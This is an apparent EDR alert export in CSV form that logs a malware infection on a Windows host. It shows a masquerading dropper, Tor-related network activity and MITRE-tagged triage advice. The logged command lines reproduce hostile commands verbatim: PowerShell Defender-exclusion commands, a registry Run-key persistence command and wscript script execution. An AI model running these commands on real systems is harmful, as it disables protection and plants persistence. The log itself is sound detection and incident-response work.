"Jun 1, 2026 @ 14:23:04.856",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_hashlib.pyd,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-688556DD
"Jun 1, 2026 @ 14:23:04.857",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_socket.pyd,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-2B9908F6
"Jun 1, 2026 @ 14:21:39.780",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF7AAB9AA78FEB7B35.TMP,,deletion,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-3CA6DD40
"Jun 1, 2026 @ 14:21:39.784",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF3D94649558FCEF55.TMP,,creation,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-71176096
"Jun 1, 2026 @ 14:23:27.243",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002w.txt,,deletion,"12,756",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-A4A276DD
"Jun 1, 2026 @ 14:23:27.244",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002_d.js,,deletion,"12,756",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-1F43A822
"Jun 1, 2026 @ 14:23:27.266",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\VCRUNTIME140_1.dll,,deletion,"12,756",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-7113A835
"Jun 1, 2026 @ 14:23:27.267",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_ctypes.pyd,,deletion,"12,756",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-385F9347
"Jun 1, 2026 @ 14:23:27.268",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_socket.pyd,,deletion,"12,756",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-CBB520BF
"Jun 1, 2026 @ 14:24:04.296",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,100,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,127.0.0.1,127.0.0.1,,,,connection_attempted,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-D059498A
"Jun 1, 2026 @ 14:24:04.329",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,100,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,127.0.0.1,127.0.0.1,,,,connection_attempted,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-E5210C99
"Jun 1, 2026 @ 14:24:52.516",C:\Users\Public\Pictures\kelotopu\uusd.exe,C:\Windows\System32\wscript.exe,"""C:\Users\Public\Pictures\kelotopu\uusd.exe"" ",EDR Rule Detection | Malware Staging | Network Outlier | Sigma Match,100,"Security rule fired on: uusd.exe | ""C:\Users\Public\Pictures\kelotopu\uusd.exe""  ; Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper",,,,,,rule_detection,"7,288",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-4D937D62
"Jun 1, 2026 @ 14:23:14.527",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath'",,,,,,rule_detection,"33,860",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-33645CB7
"Jun 1, 2026 @ 14:23:15.469",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess'",,,,,,rule_detection,"10,492",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-F5F882B3
"Jun 1, 2026 @ 14:23:16.610",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess'",,,,,,rule_detection,"11,540",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-8391357B
"Jun 1, 2026 @ 14:23:20.095",C:\Windows\System32\curl.exe,C:\Users\DELL\office_portable_x3.exe,curl -s --max-time 10 https://ipinfo.io/country,EDR Rule Detection | LOLBin Abuse | Recon / IP Discovery,100,Security rule fired on: curl.exe | curl -s --max-time 10 https://ipinfo.io/country ; Living-off-the-land binary: curl.exe ; Recon DNS query: ipinfo.io,,,,,ipinfo.io,rule_detection,"21,052",T1016,System Network Config Discovery,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-6478D627
"Jun 1, 2026 @ 14:23:26.149",C:\Windows\System32\reg.exe,C:\Users\DELL\office_portable_x3.exe,"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v xuvotopo /t REG_SZ /d ""wscript.exe \""C:\Users\Public\Pictures\kelotopu\xuvotopo.js\"""" /f",EDR Rule Detection | LOLBin Abuse | Persistence | Sigma Match,100,"Security rule fired on: reg.exe | reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v xuvotopo /t REG_SZ /d ""wscript.exe \""C ; Living-off-the-land binary: reg.exe ; Persistence registry path: hklm\software\microsoft\windows\currentversion\run\xuvotopo ; reg.exe adding a Run key entry",,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\xuvotopo,,,rule_detection,"12,252",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-7625CDB0
"Jun 1, 2026 @ 14:23:53.261",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",EDR Rule Detection | Malware Staging | Sigma Match,100,"Security rule fired on: office_portable_x3.exe | ""C:\Users\DELL\office_portable_x3.exe""  ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper",,,,,,rule_detection,"9,916",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-AC78AF4A
"Jun 1, 2026 @ 14:23:53.265",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",EDR Rule Detection | Malware Staging | Sigma Match,100,"Security rule fired on: office_portable_x3.exe | ""C:\Users\DELL\office_portable_x3.exe""  ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper",,,,,,rule_detection,"22,348",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-2F2CDD05
"Jun 1, 2026 @ 14:23:53.295",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,EDR Rule Detection | Malware Staging | Sigma Match,100,Security rule fired on: office_portable_x3.exe | C:\Users\DELL\office_portable_x3.exe ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,rule_detection,"12,756",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-C18C29B9
"Jun 1, 2026 @ 14:23:53.298",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,EDR Rule Detection | Malware Staging | Sigma Match,100,Security rule fired on: office_portable_x3.exe | C:\Users\DELL\office_portable_x3.exe ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,rule_detection,"30,312",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-5700B394
"Jun 1, 2026 @ 14:23:53.301",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath'",,,,,,rule_detection,"6,972",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-A0823433
"Jun 1, 2026 @ 14:23:53.303",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath'",,,,,,rule_detection,"2,204",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-D279226A
"Jun 1, 2026 @ 14:23:53.306",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath'",,,,,,rule_detection,"33,860",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-238B5D2D
"Jun 1, 2026 @ 14:23:53.308",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess'",,,,,,rule_detection,"10,492",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-638A8C7B
"Jun 1, 2026 @ 14:23:53.311",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess'",,,,,,rule_detection,"11,540",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-B1AB19EA
"Jun 1, 2026 @ 14:23:53.314",C:\Windows\System32\curl.exe,C:\Users\DELL\office_portable_x3.exe,curl -s --max-time 10 https://ipinfo.io/country,EDR Rule Detection | LOLBin Abuse | Recon / IP Discovery,100,Security rule fired on: curl.exe | curl -s --max-time 10 https://ipinfo.io/country ; Living-off-the-land binary: curl.exe ; Recon DNS query: ipinfo.io,,,,,ipinfo.io,rule_detection,"21,052",T1016,System Network Config Discovery,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-98E2C824
"Jun 1, 2026 @ 14:24:02.280",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-BF21A762
"Jun 1, 2026 @ 14:24:02.704",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-205C8635
"Jun 1, 2026 @ 14:24:03.113",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-B3937651
"Jun 1, 2026 @ 14:24:03.128",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-5912DCB3
"Jun 1, 2026 @ 14:24:03.693",C:\Users\Public\Pictures\kelotopu\uusd.exe,C:\Windows\System32\wscript.exe,"""C:\Users\Public\Pictures\kelotopu\uusd.exe"" ",EDR Rule Detection | Malware Staging | Network Outlier | Sigma Match,100,"Security rule fired on: uusd.exe | ""C:\Users\Public\Pictures\kelotopu\uusd.exe""  ; Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper",,,,,,rule_detection,"7,288",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-97AB148B
"Jun 1, 2026 @ 14:24:52.501",C:\Windows\System32\reg.exe,C:\Users\DELL\office_portable_x3.exe,"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v xuvotopo /t REG_SZ /d ""wscript.exe \""C:\Users\Public\Pictures\kelotopu\xuvotopo.js\"""" /f",EDR Rule Detection | LOLBin Abuse | Persistence | Sigma Match,100,"Security rule fired on: reg.exe | reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v xuvotopo /t REG_SZ /d ""wscript.exe \""C ; Living-off-the-land binary: reg.exe ; Persistence registry path: hklm\software\microsoft\windows\currentversion\run\xuvotopo ; reg.exe adding a Run key entry",,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\xuvotopo,,,rule_detection,"12,252",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-9168EEB0
"Jun 1, 2026 @ 14:24:52.504",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-329AF738
"Jun 1, 2026 @ 14:24:52.508",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-CE80C87B
"Jun 1, 2026 @ 14:24:52.510",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-9C84DAE0
"Jun 1, 2026 @ 14:24:52.513",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-6E3AF984
"Jun 1, 2026 @ 14:24:18.456",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,External Communication | Malware Staging | Network Outlier | Sigma Match,95,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; Outbound to external IP: 96.9.98.205 ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,173.10.254.170,96.9.98.205,,,,connection_attempted,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Block destination IP at perimeter; review netflow,AH-2793E4CE
"Jun 1, 2026 @ 14:24:18.402",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,External Communication | Malware Staging | Network Outlier | Sigma Match,95,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; Outbound to external IP: 94.130.10.179 ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,173.10.254.170,94.130.10.179,,,,connection_attempted,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Block destination IP at perimeter; review netflow,AH-2FA6B1CC
"Jun 1, 2026 @ 14:24:08.788",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,External Communication | Malware Staging | Network Outlier | Sigma Match,95,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; Outbound to external IP: 95.179.162.106 ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,173.10.254.170,95.179.162.106,,,,connection_attempted,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Block destination IP at perimeter; review netflow,AH-BF365E34
"Jun 1, 2026 @ 14:23:19.992",C:\Windows\System32\lsass.exe,,,Sigma Match,90,Unusual process accessing LSASS memory,,,,,ctldl.windowsupdate.com,lookup_requested,992,T1003.001,,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Review matching Sigma rule for context-specific guidance,AH-DF59AB28
"Jun 1, 2026 @ 14:23:20.146",C:\Windows\System32\lsass.exe,,,Sigma Match,90,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\103621DE9CD5414CC2538780B4B75751,,creation,992,T1003.001,,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Review matching Sigma rule for context-specific guidance,AH-649C26CE
"Jun 1, 2026 @ 14:23:20.470",C:\Windows\System32\lsass.exe,,,Sigma Match,90,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\453FD74286E7A811168BF9CC3CB55EB2,,creation,992,T1003.001,,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Review matching Sigma rule for context-specific guidance,AH-6F1662D7
"Jun 1, 2026 @ 14:24:18.082",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\cached-microdesc-consensus.tmp,,creation,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-F3A26FE5
"Jun 1, 2026 @ 14:24:49.776",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state,,rename,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-D1D435A0
"Jun 1, 2026 @ 14:21:18.303",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,80,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\onenote.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\onenotem.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\onenote.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-4ADFAF1F
"Jun 1, 2026 @ 14:24:04.305",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,80,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\Sarthak_Primus\AppData\Roaming\tor\state,,rename,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-7088201D
